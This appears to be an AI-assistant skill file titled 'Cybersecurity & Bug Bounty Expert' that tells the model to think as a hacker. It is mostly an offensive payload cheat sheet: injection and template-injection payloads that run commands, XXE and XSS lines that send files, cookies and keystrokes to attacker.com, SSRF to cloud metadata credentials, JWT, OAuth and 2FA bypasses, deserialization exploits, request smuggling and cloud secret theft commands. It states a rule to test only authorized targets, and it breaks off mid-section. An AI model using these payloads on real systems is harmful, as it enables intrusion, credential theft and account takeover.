# Cybersecurity & Bug Bounty Expert

## Description
Elite cybersecurity skill covering offensive security, bug bounty hunting, penetration testing, vulnerability research, exploit development, and defensive security. Covers white/grey/black hat methodologies, OWASP Top 10, API security, mobile app security, cloud security, binary exploitation, web hacking, social engineering awareness, and advanced attack chains. Think like an attacker, defend like a paranoid sysadmin. Use when: security testing, bug bounty hunting, vulnerability assessment, penetration testing, code review for security, threat modeling, exploit development, CTF challenges, red teaming, security architecture review.

## Trigger Keywords
bug bounty, pentest, penetration test, vulnerability, exploit, security audit, CVE, OWASP, XSS, SQLi, SSRF, RCE, IDOR, CSRF, authentication bypass, authorization bypass, privilege escalation, reverse engineering, malware, threat model, red team, CTF, capture the flag, security review, hack, hacking, infosec, appsec, websec, cloud security, API security, mobile security

---

## 🧠 THE HACKER MINDSET

### Core Philosophy
You are not a scanner. You are not a tool runner. You are a **hacker**.

A hacker sees what others don't. Every input field is a conversation with the backend. Every error message is a confession. Every 403 is an invitation. Every "feature" is a potential vulnerability.

### Thinking Framework
1. **Question everything** — Why does this work this way? What assumptions did the developer make?
2. **Break the contract** — Every system has implicit rules. Find them. Violate them.
3. **Follow the data** — Where does user input go? What trusts it? What doesn't validate it?
4. **Think in chains** — A low-severity bug alone is noise. Chained with another, it's critical.
5. **Be patient** — The best bugs come from deep understanding, not mass scanning.
6. **Assume nothing** — "They probably check that" = they probably don't.

### The Three Laws
1. **Authorized targets only** — Never test without permission. Ever.
2. **Document everything** — If you can't prove it, you didn't find it.
3. **Minimize harm** — Prove impact without causing damage.

---

## 📋 RECON — Intelligence Gathering

### Passive Recon (No direct contact with target)

#### Subdomain Enumeration
```bash
# Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.TARGET.com&output=json" | jq -r '.[].name_value' | sort -u

# Multiple tools for coverage
subfinder -d TARGET.com -all -silent
amass enum -passive -d TARGET.com
assetfinder --subs-only TARGET.com

# DNS brute force
puredns bruteforce wordlist.txt TARGET.com --resolvers resolvers.txt

# Combine and deduplicate
cat subs_*.txt | sort -u | httpx -silent -o live_hosts.txt
```

#### Infrastructure Mapping
```bash
# ASN discovery
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"
bgp.he.net — search by org name

# Reverse IP / shared hosting
dig +short TARGET.com | xargs -I{} curl -s "https://api.hackertarget.com/reverseiplookup/?q={}"

# Historical DNS
securitytrails.com API, DNSDumpster, VirusTotal

# Cloud ranges
# AWS: check if target uses S3, CloudFront, EC2
# GCP: storage.googleapis.com buckets
# Azure: blob.core.windows.net
```

#### OSINT
```bash
# Google dorking
site:TARGET.com filetype:pdf | doc | xlsx | env | sql | log | bak | conf
site:TARGET.com inurl:admin | login | dashboard | api | debug | test
site:TARGET.com "password" | "secret" | "token" | "api_key"
site:pastebin.com "TARGET.com"
site:github.com "TARGET.com" password | secret | key | token

# GitHub recon
github-dorker -d TARGET.com -t GITHUB_TOKEN
trufflehog github --org=TARGET-ORG --only-verified

# Wayback Machine
echo TARGET.com | gau --threads 5
echo TARGET.com | waybackurls
cat wayback_urls.txt | grep -E "\.(js|json|xml|csv|sql|env|config|bak|old|log)" | sort -u

# JS file analysis
cat wayback_urls.txt | grep "\.js$" | httpx -silent -mc 200 | while read url; do
  curl -s "$url" | grep -oE "(api|internal|admin|staging|dev|test)[a-zA-Z0-9/._-]+" 
done
```

### Active Recon

#### Port Scanning & Service Detection
```bash
# Fast initial scan
nmap -sS -p- --min-rate 10000 -oA full_tcp TARGET.com
# Service detection on open ports
nmap -sV -sC -p OPEN_PORTS -oA services TARGET.com
# UDP (top ports)
nmap -sU --top-ports 100 TARGET.com
# Vulnerability scripts
nmap --script vuln -p OPEN_PORTS TARGET.com
```

#### Web Technology Fingerprinting
```bash
# Tech stack identification
httpx -l live_hosts.txt -tech-detect -status-code -title -web-server -follow-redirects
whatweb -a 3 TARGET.com
wappalyzer (browser extension for manual recon)

# WAF detection
wafw00f TARGET.com
# If WAF present: note type, plan bypasses for each vuln class
```

#### Content Discovery
```bash
# Directory brute force (smart wordlists)
ffuf -u https://TARGET.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -o dirs.json
# File discovery
ffuf -u https://TARGET.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301,302,403
# API endpoint discovery
ffuf -u https://TARGET.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
# Parameter discovery
arjun -u https://TARGET.com/endpoint -m GET POST
# Recursive on interesting dirs
feroxbuster -u https://TARGET.com -w wordlist.txt --depth 3 -o ferox.txt
```

#### API Discovery
```bash
# Swagger/OpenAPI docs (common paths)
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /v1/api-docs /v2/api-docs /v3/api-docs /.well-known/openapi.yaml /docs /redoc; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://TARGET.com$path"
done

# GraphQL endpoint detection
for path in /graphql /graphiql /playground /api/graphql /gql /query; do
  curl -s -X POST "https://TARGET.com$path" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -c 200
done

# GraphQL introspection
curl -s -X POST "https://TARGET.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq
```

---

## 🎯 VULNERABILITY CLASSES — Deep Dive

### 1. Injection Attacks

#### SQL Injection (SQLi)
```
# Detection
' OR 1=1-- -
' UNION SELECT NULL--
' AND SLEEP(5)--
" OR ""="
1; WAITFOR DELAY '0:0:5'--

# Blind SQLi (boolean-based)
' AND 1=1-- (true condition — normal response)
' AND 1=2-- (false condition — different response)
' AND SUBSTRING(@@version,1,1)='5'--

# Blind SQLi (time-based)
' AND IF(1=1,SLEEP(5),0)--                     # MySQL
'; WAITFOR DELAY '0:0:5'--                      # MSSQL
' AND pg_sleep(5)--                             # PostgreSQL
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- # SQLite

# Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- # MySQL
' AND CAST((SELECT version()) AS int)--          # PostgreSQL

# UNION-based (find column count first)
' ORDER BY 1-- (increment until error)
' UNION SELECT NULL,NULL,NULL-- (match column count)
' UNION SELECT username,password,NULL FROM users--

# Second-order SQLi
Register with username: admin'--
Then trigger the injection in a different feature that queries by username

# ORM injection (NoSQL-style in SQL ORMs)
# Sequelize: { where: { [Op.or]: [{username: input}] } }
# If input is object: {"username": {"$ne": ""}} → bypasses auth

# Out-of-band (when no visible output)
# MySQL: LOAD_FILE('\\\\attacker.com\\share')
# MSSQL: exec master..xp_dirtree '\\attacker.com\share'
# PostgreSQL: COPY (SELECT '') TO PROGRAM 'curl attacker.com'

# Tools
sqlmap -u "https://TARGET.com/page?id=1" --batch --risk 3 --level 5
sqlmap --crawl=3 --forms --batch -u "https://TARGET.com"
# Tamper scripts for WAF bypass
sqlmap -u URL --tamper=space2comment,between,randomcase
```

#### NoSQL Injection
```
# MongoDB
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$regex": "^a"}}  # Extract char by char

# Where clause injection
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "sleep(5000)"}  # Time-based

# Aggregation pipeline injection
[{"$match": {"$where": "1==1"}}]
```

#### Command Injection (OS Command Injection)
```
# Basic
; id
| id
`id`
$(id)
& id
&& id
|| id
%0aid          # Newline
${IFS}id       # IFS as separator

# Blind (no output)
; sleep 5
| curl attacker.com/$(whoami)
; ping -c 5 attacker.com
; nslookup $(whoami).attacker.com

# Filter bypass
c$()at /etc/passwd
c''at /etc/passwd
c\at /etc/passwd
/???/??t /???/p??s??    # Glob patterns
$(printf '\x63\x61\x74') /etc/passwd  # Hex encoding

# In different contexts
Image processing: filename with backticks
PDF generators: LaTeX injection → \input{/etc/passwd}
Email headers: CRLF → inject commands via sendmail
Git operations: repo name injection
```

#### Server-Side Template Injection (SSTI)
```
# Detection polyglot
${{<%[%'"}}%\

# Jinja2 (Python/Flask)
{{7*7}}                                    # → 49
{{config.items()}}                         # Info disclosure
{{''.__class__.__mro__[1].__subclasses__()}}  # Class hierarchy
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
# Find subprocess.Popen index X by iterating subclasses

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>

# Pug/Jade (Node.js)
#{7*7}
#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}

# Handlebars (Node.js)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### XML External Entity (XXE)
```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>

<!-- Blind XXE (out-of-band) -->
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<!-- evil.dtd on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- XXE in different formats -->
<!-- SVG: --> <image xlink:href="file:///etc/passwd"/>
<!-- DOCX: --> Edit word/document.xml inside the zip
<!-- XLSX: --> Edit xl/sharedStrings.xml
<!-- SOAP: --> Insert DOCTYPE in SOAP envelope
<!-- JSON→XML: --> If server converts JSON to XML internally

<!-- XXE via file upload -->
<!-- Upload .svg, .xml, .docx, .xlsx with XXE payloads -->
```

#### LDAP Injection
```
# Auth bypass
*)(uid=*))(|(uid=*
admin)(|(password=*))
*))(&(objectClass=*

# Data extraction
*)(mail=*))(&(objectClass=user)(cn=
```

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><mi><svg onload=alert(1)>

<!-- Filter bypass -->
<ScRiPt>alert(1)</ScRiPt>                    <!-- Mixed case -->
<script>alert`1`</script>                     <!-- Template literals -->
<img src=x onerror="&#97;lert(1)">           <!-- HTML entities -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- Base64 -->
<script>window['al'+'ert'](1)</script>        <!-- String concat -->
<script>this[`al${`ert`}`](1)</script>        <!-- Template literal -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(alert(1))//   <!-- Polyglot -->

<!-- DOM-based sinks -->
document.write(location.hash)
element.innerHTML = user_input
$.html(user_input)
eval(user_input)
setTimeout(user_input)
location = user_input
```

#### Stored XSS
```
# Common locations
User profiles (name, bio, website)
Comments / reviews / feedback
File names (upload a file named "><img src=x onerror=alert(1)>.jpg)
Email subjects / bodies (webmail)
Chat messages
Forum posts
Markdown renderers (bypass sanitization)
SVG uploads with embedded JS
CSV injection → opens in browser with XSS
```

#### DOM XSS Sources & Sinks
```javascript
// Sources (attacker-controlled)
location.hash, location.search, location.href
document.referrer
document.cookie
window.name
postMessage data
Web Storage (localStorage, sessionStorage)
URL fragments, query parameters

// Sinks (dangerous functions)
eval(), Function(), setTimeout(), setInterval()
document.write(), document.writeln()
element.innerHTML, element.outerHTML
element.insertAdjacentHTML()
$.html(), $.append(), $.prepend()
location.href, location.assign(), location.replace()
window.open()
document.domain
```

#### XSS to Impact
```javascript
// Cookie theft
fetch('https://attacker.com/?c='+document.cookie)

// Session hijacking
new Image().src='https://attacker.com/steal?cookie='+document.cookie

// Keylogging
document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}

// Phishing (inject fake login)
document.body.innerHTML='<form action=https://attacker.com/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'

// CSRF via XSS (chain!)
fetch('/api/admin/create-user', {method:'POST', headers:{'Content-Type':'application/json'}, body:'{"username":"hacker","role":"admin"}', credentials:'include'})

// Account takeover via password change
fetch('/api/change-password', {method:'POST', body:'newpass=hacked123', credentials:'include'})
```

### 3. Server-Side Request Forgery (SSRF)

```
# Basic
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]          # IPv6 loopback
http://0x7f000001     # Hex IP
http://2130706433     # Decimal IP
http://017700000001   # Octal IP
http://127.1          # Short form
http://0              # Zero

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# IMDSv2 bypass attempts
http://169.254.169.254/latest/api/token (PUT with header)

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/ (needs Metadata-Flavor: Google header)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (needs Metadata: true header)

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Kubernetes
https://kubernetes.default.svc
https://kubernetes.default.svc/api/v1/secrets

# Internal service scanning
http://192.168.0.1:PORT
http://10.0.0.1:PORT
http://172.16.0.1:PORT

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aSET%0d%0a...  # Redis via gopher
dict://127.0.0.1:6379/info                                # Redis via dict
file:///etc/passwd                                          # Local file read

# DNS rebinding (bypass IP validation)
# Register domain that resolves to 127.0.0.1 after first DNS query
# Use services like rebind.network, 1u.ms

# URL parsing differential
http://attacker.com@127.0.0.1/  # Some parsers use host after @
http://127.0.0.1#@attacker.com  # Fragment confusion
http://127.0.0.1%2523@attacker.com  # Double encoding
http://attacker.com/redirect?url=http://127.0.0.1  # Open redirect → SSRF

# Bypass common filters
http://127.0.0.1.nip.io         # DNS wildcard services
http://spoofed.burpcollaborator.net  # Resolves to internal
http://localtest.me             # Resolves to 127.0.0.1
```

### 4. Broken Access Control

#### IDOR (Insecure Direct Object Reference)
```
# Numeric IDs
GET /api/users/123         → try /api/users/124
GET /api/invoice/1001      → try /api/invoice/1002
GET /api/orders/5000       → try /api/orders/5001

# UUIDs (still vulnerable!)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# Enumerate from API responses, search in JS bundles, check other endpoints

# Encoded/hashed IDs
# Base64: decode, change value, re-encode
# MD5/SHA: try hashing sequential values
# JWT: decode payload, check for user IDs

# HTTP method tampering
GET /api/admin/users       → 403
POST /api/admin/users      → 200? 
PUT /api/admin/users       → 200?
PATCH /api/admin/users     → 200?

# Path traversal for access control bypass
GET /api/users/me/settings → /api/users/123/settings
GET /user/profile          → /admin/profile
GET /api/v1/data           → /api/v2/data (different auth?)

# Parameter pollution
GET /api/users?id=me&id=admin
GET /api/transfer?from=me&to=attacker&from=victim  # HPP

# Mass assignment
POST /api/users {name: "test", role: "admin"}      # Add role field
PUT /api/profile {email: "me@x.com", isAdmin: true} # Add admin flag
```

#### Privilege Escalation
```
# Vertical (user → admin)
- Modify role/permission in JWT payload
- Change user type in request body
- Access admin endpoints directly (missing middleware)
- Tamper with cookies (role=user → role=admin)
- Register as admin via manipulated signup

# Horizontal (user A → user B)
- Swap user IDs in API calls
- Change email in profile to victim's email
- Password reset token prediction
- Session fixation

# API versioning bypass
/api/v3/admin → 403 (secured)
/api/v1/admin → 200 (old version, no auth check!)
/api/internal/admin → 200 (internal endpoint exposed)
```

### 5. Authentication Attacks

#### Password Reset Flaws
```
# Token in response
POST /forgot-password → Response includes reset token

# Predictable tokens
Tokens based on timestamp, sequential, or weak random

# Host header poisoning
POST /forgot-password
Host: attacker.com
→ Reset link goes to attacker.com

# Email parameter injection
email=victim@target.com%0a%0dcc:attacker@evil.com
email=victim@target.com,attacker@evil.com
email[]=victim@target.com&email[]=attacker@evil.com

# Token not invalidated after use
Use same reset token multiple times

# Token not tied to email
Get token for your account, use it to reset victim's password
```

#### JWT Attacks
```
# None algorithm
# Change header to {"alg":"none"} and remove signature
# Payload: {"sub":"admin","iat":1234567890}
# Token: eyJ...header.eyJ...payload.

# Algorithm confusion (RS256 → HS256)
# If server verifies with public key and accepts HS256,
# sign with the public key as HMAC secret

# Key brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
jwt-cracker "eyJ..." -w wordlist.txt

# JWK injection
# Add "jwk" to header with attacker's public key
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}

# Kid (Key ID) injection
{"kid":"../../../../../../etc/passwd","alg":"HS256"}
# Sign with content of /etc/passwd as key

# Claim tampering
# Change sub, role, admin, group_id fields
# Check exp — extend expiration
# Check iss — spoof issuer
```

#### OAuth/OIDC Attacks
```
# Open redirect in redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com/callback/../../../attacker-controlled-path
?redirect_uri=https://target.com%40attacker.com

# CSRF in OAuth flow (missing state parameter)
Craft authorization URL without state, send to victim

# Token theft via referrer
If redirect page has external links, code/token leaks in Referrer header

# Authorization code replay
Use code multiple times if not invalidated

# Scope manipulation
Request additional scopes not shown in consent screen
scope=read+write+admin

# PKCE downgrade
Remove code_challenge from auth request if server doesn't enforce
```

#### 2FA Bypass
```
# Direct endpoint access (skip 2FA step)
After password auth, go directly to /dashboard instead of /verify-2fa

# Response manipulation
Intercept verify response, change {"success":false} to {"success":true}

# Brute force OTP
4-digit: 10,000 possibilities
6-digit: 1,000,000 — check rate limiting!
Race condition: send many requests simultaneously

# Backup codes
Brute force backup codes if no rate limit
Check if backup code endpoint has different rate limits

# Remember me token manipulation
If "remember device" sets a cookie, try replaying or predicting it

# 2FA reset
Social engineering support
Password reset bypasses 2FA
Account recovery flow skips 2FA
```

### 6. Business Logic Vulnerabilities

```
# Price manipulation
Change price in cart request: {"item":"laptop","price":0.01}
Negative quantities: {"qty":-1} → refund?
Currency confusion: submit in weaker currency
Coupon stacking: apply same coupon multiple times
Race condition on discount: apply before validation completes

# State machine abuse
Skip steps in workflow (go from step 1 to step 5)
Repeat a step that shouldn't be repeatable
Cancel after benefit received
Modify order after payment but before processing

# Feature abuse
Invite yourself to premium features via API
Free trial reset (new email, cookie/fingerprint manipulation)
Referral system abuse (self-referral)
Points/rewards system manipulation

# Race conditions
Simultaneous transfers from same account (double-spend)
Simultaneous coupon redemption
Simultaneous vote/like (inflate counts)
TOCTOU (Time of Check, Time of Use) — check balance, then deduct separately

# Tool: Turbo Intruder (Burp), race-the-web, custom async scripts
```

### 7. File Upload Vulnerabilities

```
# Extension bypass
file.php → blocked
file.php5, file.phtml, file.phar → allowed?
file.php.jpg → double extension
file.php%00.jpg → null byte (old servers)
file.php;.jpg → semicolon (IIS)
file.PHP → case sensitivity
file.php. → trailing dot (Windows)
file.php::$DATA → NTFS ADS (Windows)
.htaccess upload → redefine handlers

# Content-Type bypass
Change Content-Type: application/x-php → image/jpeg

# Magic bytes
Add GIF89a; at start of PHP file (passes magic byte check)
Embed PHP in valid image (exiftool -Comment='<?php system($GET["cmd"]); ?>' img.jpg)

# SVG XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# ZIP-based attacks
Upload ZIP containing symlink → read arbitrary files
ZIP slip → path traversal in extraction (../../etc/cron.d/shell)
Polyglot files (valid image + valid zip)

# Image processing vulnerabilities
ImageMagick: CVE-2016-3714 (ImageTragick)
convert exploit.mvg output.png → RCE
Ghostscript: PDF → RCE
FFmpeg: SSRF via HLS playlist
```

### 8. API Security (OWASP API Top 10 2023)

```
# API1: Broken Object Level Authorization (BOLA/IDOR)
→ See IDOR section above

# API2: Broken Authentication
→ JWT attacks, weak tokens, no rate limiting on login

# API3: Broken Object Property Level Authorization
→ Mass assignment: send extra fields in POST/PUT
→ Excessive data exposure: API returns more than UI shows

# API4: Unrestricted Resource Consumption
→ No pagination limits: GET /api/users?limit=999999999
→ Regex DoS (ReDoS): craft input that causes exponential backtracking
→ GraphQL: deeply nested queries, batched queries
query { users { friends { friends { friends { friends { name } } } } } }

# API5: Broken Function Level Authorization
→ Replace GET with DELETE, PUT, PATCH
→ /api/users/me → /api/admin/users
→ /api/v1/users → /api/internal/users

# API6: Unrestricted Access to Sensitive Business Flows
→ Automated ticket scalping, credential stuffing
→ Mass data harvesting without rate limits

# API7: Server Side Request Forgery
→ See SSRF section above

# API8: Security Misconfiguration
→ CORS: Access-Control-Allow-Origin: *
→ Verbose errors in production
→ Default credentials on admin panels
→ Unnecessary HTTP methods enabled
→ Missing security headers

# API9: Improper Inventory Management
→ Old API versions still accessible
→ Debug endpoints in production (/debug, /test, /health with sensitive data)
→ Shadow APIs (undocumented endpoints found in JS/mobile apps)

# API10: Unsafe Consumption of APIs
→ Third-party API responses not validated
→ SSRF via webhook URLs
→ Deserialization of external data
```

### 9. GraphQL Attacks

```graphql
# Introspection (information disclosure)
{ __schema { types { name fields { name type { name } } } } }
{ __schema { mutationType { fields { name args { name type { name } } } } } }

# If introspection disabled, use field suggestion errors
{ user { DOESNOTEXIST } } → "Did you mean: id, name, email?"
# Tools: clairvoyance (reconstructs schema from suggestions)

# Batching attack (bypass rate limiting)
[
  {"query": "mutation { login(user:\"admin\",pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass2\") { token } }"},
  ... # 1000 attempts in one request
]

# Alias-based batching
{
  a1: login(user:"admin", pass:"pass1") { token }
  a2: login(user:"admin", pass:"pass2") { token }
  a3: login(user:"admin", pass:"pass3") { token }
}

# DoS via deep nesting
{ users { friends { friends { friends { friends { name } } } } } }

# SQL injection in arguments
{ user(name: "admin' OR 1=1--") { id email } }

# Authorization bypass — access fields through relationships
{ public_post(id: 1) { author { email privateField ssn } } }

# Directive abuse
{ user @include(if: true) @skip(if: false) { adminField } }
```

### 10. Deserialization Attacks

```
# Java (most common in enterprise)
# Look for: rO0AB (base64) or ac ed 00 05 (hex) in cookies/parameters
# Tool: ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# PHP
# Look for: O:4:"User":2:{s:4:"name";s:5:"admin";}
# Modify serialized objects, change class names, inject __wakeup/__destruct
# Tool: PHPGGC
phpggc Laravel/RCE1 system id

# Python (pickle)
# Look for: base64-encoded pickle in cookies/tokens
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())

# .NET
# Look for: VIEWSTATE, TypeNameHandling in JSON
# Tool: ysoserial.net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc"

# Node.js
# node-serialize: vulnerable to IIFE injection
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

### 11. Prototype Pollution (JavaScript)

```javascript
// Detection
// Merge/deep-copy functions that don't sanitize __proto__
POST /api/config
{"__proto__": {"isAdmin": true}}
// or
{"constructor": {"prototype": {"isAdmin": true}}}

// In URL parameters
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true

// Server-side impact
// If polluted property is checked: if(user.isAdmin) → true for ALL objects
// Can escalate to RCE via polluting child_process options

// Client-side impact
// DOM XSS via polluted innerHTML, src, href properties
// Bypass sanitizers by polluting their config
```

### 12. Request Smuggling

```
# CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (obfuscate Transfer-Encoding)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

# HTTP/2 smuggling (H2.CL, H2.TE)
# Use HTTP/2 pseudo-headers to inject HTTP/1.1 in backend

# Impact
→ Bypass WAF/security controls
→ Poison web cache
→ Hijack other users' requests
→ Steal credentials from proxied requests
```

### 13. Cache Poisoning

```
# Web cache poisoning via unkeyed headers
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
# If response is cached with attacker content → all users get poisoned

# Unkeyed headers to test
X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto
X-Original-URL, X-Rewrite-URL
X-Custom-IP-Authorization
Origin (if reflected)

# Cache key normalization
/api/users → cached
/api/users?cachebuster=1 → not cached → test here
/API/USERS → same cache key?
/api/users/ → same cache key?
/api/users;jsessionid=xxx → same cache key?

# Cache deception
GET /api/account/details.css → cached? (path confusion)
GET /api/account%2fdetails → normalized to /api/account/details?
/api/account/.css → static file cache rule matches?

# Response splitting
Header injection → inject Set-Cookie or Location headers
→ Stored in cache → affects all users

# Tool: param-miner (Burp extension) — finds unkeyed inputs
```

### 14. WebSocket Attacks

```
# Missing authentication
Connect to wss://target.com/ws without auth token
Send privileged commands

# Cross-site WebSocket hijacking (CSWSH)
# If no Origin validation on WS handshake:
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
  fetch('https://attacker.com/log?data=' + e.data);
};
ws.onopen = function() {
  ws.send('{"action":"get_admin_data"}');
};
</script>

# Message manipulation
Inject additional JSON fields
Change user IDs in messages
Send malformed frames

# DoS
Rapid connection/disconnection
Oversized messages
Resource exhaustion
```

### 15. Race Conditions (Advanced)

```python
# Single-endpoint race (limit check bypass)
import asyncio, aiohttp

async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(50):
            tasks.append(session.post(
                'https://target.com/api/redeem-coupon',
                json={"code": "DISCOUNT50"},
                headers={"Cookie": "session=..."}
            ))
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(exploit())

# Multi-endpoint race (TOCTOU)
# Step 1: Check balance (returns $100)
# Step 2: Transfer $100 (deducts)
# Race: Send transfer twice before balance updates

# File-based race
# Upload file → server checks extension → renames
# Access file between upload and rename

# Database race
# Read-check-update without locks
# SELECT balance → if sufficient → UPDATE balance
# Two concurrent requests both pass the check
```

---

## 🌐 CLOUD SECURITY

### AWS
```bash
# S3 bucket misconfiguration
aws s3 ls s3://TARGET-BUCKET --no-sign-request
aws s3 cp s3://TARGET-BUCKET/secret.txt . --no-sign-request

# Common bucket names
{company}-backup, {company}-dev, {company}-staging, {company}-prod
{company}-assets, {company}-uploads, {company}-logs

# IAM enumeration (if you have creds)
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam get-policy --policy-arn ARN

# Lambda function code theft
aws lambda get-function --function-name FUNC → download URL for code

# EC2 metadata from SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
→ AccessKeyId, SecretAccessKey, Token → full AWS access

# Cognito misconfiguration
# Self-registration enabled
# Custom attributes writable (custom:role = admin)
aws cognito-idp sign-up --client-id ID --username attacker --password Pass123!
aws cognito-idp admin-update-user-attributes --user-pool-id POOL --username attacker --user-attributes Name="custom:role",Value="admin"
```

### GCP
```bash
# Service account key files
# Look for: .json files with "type": "service_account"
# In: repos, CI/CD configs, environment variables

# Storage bucket enumeration
gsutil ls gs://TARGET-BUCKET

# Metadata server
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```bash
# Blob storage enumeration
https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Function app source code
https://FUNCAPP.scm.azurewebsites.net/api/zip/site/wwwroot

# Managed identity
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Kubernetes
```bash
# If you can reach the API server
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
kubectl exec -it POD -- /bin/sh

# From inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# etcd (if exposed)
etcdctl get / --prefix --keys-only
etcdctl get /registry/secrets/default/SECRET_NAME
```

---

## 📱 MOBILE SECURITY

### Android
```bash
# APK extraction
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /path/to/base.apk

# Decompilation
apktool d target.apk -o target_decompiled/
jadx -d target_jadx target.apk
# Check: AndroidManifest.xml, strings.xml, source code

# Key findings to look for
grep -rn "api_key\|secret\|password\|token\|firebase\|aws" target_jadx/
grep -rn "http://" target_jadx/  # Insecure connections
cat target_decompiled/res/values/strings.xml | grep -i "key\|secret\|url\|api"

# AndroidManifest.xml checks
- android:debuggable="true" → attach debugger
- android:allowBackup="true" → extract app data
- android:exported="true" on activities → launch directly
- Deep links/intent filters → abuse URI schemes
- Cleartext traffic allowed

# Network security config
target_decompiled/res/xml/network_security_config.xml
- Certificate pinning bypasses
- Trust user-installed CAs

# Dynamic analysis
